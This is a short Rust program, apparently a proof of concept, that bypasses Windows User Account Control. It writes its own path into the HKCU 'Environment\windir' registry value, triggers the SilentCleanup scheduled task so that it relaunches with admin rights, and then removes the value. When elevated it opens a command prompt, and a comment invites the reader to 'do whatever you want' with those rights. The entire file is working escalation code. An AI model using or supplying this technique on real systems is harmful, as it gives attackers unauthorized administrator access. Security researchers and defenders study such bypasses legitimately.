fn main() {
  // Check the elevation
  if !common::is_elevated() {
    println!("[+] Elevating...");

    let value_path = &r"Environment\windir";

    // Add the "windir" registry key
    common::registry::set_value(
      common::registry::HKEY_CURRENT_USER,
      value_path,
      &format!("\"{}\"", std::env::current_exe().unwrap().to_string_lossy()),
    )
    .unwrap();

    // Run the SilentCleanup task
    common::scheduled_tasks::run_task(&r"\Microsoft\Windows\DiskCleanup\SilentCleanup").unwrap();

    // Delete the "windir" registry key
    common::registry::delete_value(common::registry::HKEY_CURRENT_USER, value_path).unwrap();
  } else {
    // do whatever you want here with admin privileges.
    // in this case, I just spawn a command prompt.
    std::process::Command::new("cmd").spawn().unwrap();
  }
}
